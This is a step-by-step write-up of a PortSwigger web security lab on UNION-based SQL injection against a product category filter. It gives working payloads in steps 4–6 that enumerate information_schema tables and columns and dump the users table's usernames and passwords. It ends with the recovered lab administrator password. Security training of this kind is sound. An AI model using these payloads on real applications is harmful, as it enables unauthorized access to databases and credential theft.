# Lab: SQL injection attack, listing the database contents on non-Oracle databases
## Description
*This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.*

*The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.*

*To solve the lab, log in as the administrator user.*

## HINT

You can find some useful payloads on our [SQL injection cheat sheet.](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

# STEP 1: Verify SQLi

Normal function of Accessories parameter of the catagory filter:

![image](https://user-images.githubusercontent.com/83407557/169705069-d5ab5ebe-9847-47b3-88bc-c952aa424de9.png)

Adding a single quote to cause a server side error:

![image](https://user-images.githubusercontent.com/83407557/169705114-d1bece26-5e08-41b4-b82f-af523e473c86.png)

Then a comment to remove it and verify injection point

![image](https://user-images.githubusercontent.com/83407557/169705142-c4193d8b-cfc9-44f2-bad6-3857c369d1fd.png)


# STEP 2: Determine number of columns being returned by the query

using UNION SELECT NULL inside our '**injection point**-- 

## Test for 1 column

![image](https://user-images.githubusercontent.com/83407557/169705227-ab075686-e71c-4bc1-867f-52a435ba6277.png)

## Test for 2 columns

![image](https://user-images.githubusercontent.com/83407557/169705245-26bc40a1-e7a3-4513-92d3-a21d88a5b4ff.png)

this verifies that there are 2 columns being returned.

# STEP 3: Determine which columns return string data

## Test for column 1

![image](https://user-images.githubusercontent.com/83407557/169705312-58b23cff-1369-42ee-951e-7e89a705384f.png)

It will return string data

## Test for column 2

![image](https://user-images.githubusercontent.com/83407557/169705347-9ac350ab-b386-48f3-a3b6-96bdee4be315.png)

which also returns string data

# STEP 4: Get a list of tables in the database

For non oracle databases this can be done using the following SQL query:

```sql
 SELECT table_name FROM information_schema.tables
 ```
 Since column 2 seems more readable on screen, that is where I will put this payload, I will also replace 'abc' with 'TABLES IN THE DATABASE:' just to make that my title(since I already know where the strings will be displayed from step 3)
 
 Making the entire query:
 
 ```sql
'UNION SELECT 'TABLES IN THE DATABASE', table_name FROM information_schema.tables--
 ```
 
 This returns every table, searching through the output I find one that seems interesting:
 
 ![image](https://user-images.githubusercontent.com/83407557/169705763-c7e74107-e0a0-4bab-a8f5-7a65a7050da5.png)

# STEP 5: Get a list of columns in the found table.

Now that I know that I want to look at the table users_mwjhvu I can list the columns in a similar way, but using a where clause

```sql
'UNION SELECT 'Column in users table', column_name FROM information_schema.columns WHERE table_name='users_mwjhvu'--
```
![image](https://user-images.githubusercontent.com/83407557/169705955-63e2bbf3-cbba-4f44-b8b0-19f0380db88b.png)

# STEP 6: Get the rows from the users table

In order to get the information from another table with a union statement I need the table name(users_mwjhvu) and the column names (username_gntgua, password_edgpza). Since I also know that both columns return string data, I can make my SQL query like the following:

```sql
'UNION SELECT username_gntgua, password_edgpza FROM users_mwjhvu--
```

Which gives me the username and password of everyone in the database:

![image](https://user-images.githubusercontent.com/83407557/169706144-72a36dcb-d364-40a0-84a5-452b19f0d9a0.png)

---

# STEP 7 Log in as Administrator

since I found the password was oj29mbkl6pd8ff4ddswx i can now use that to login and solve the lab.

![image](https://user-images.githubusercontent.com/83407557/169706200-1205dac1-1ec2-40d9-9be9-abf13740585e.png)

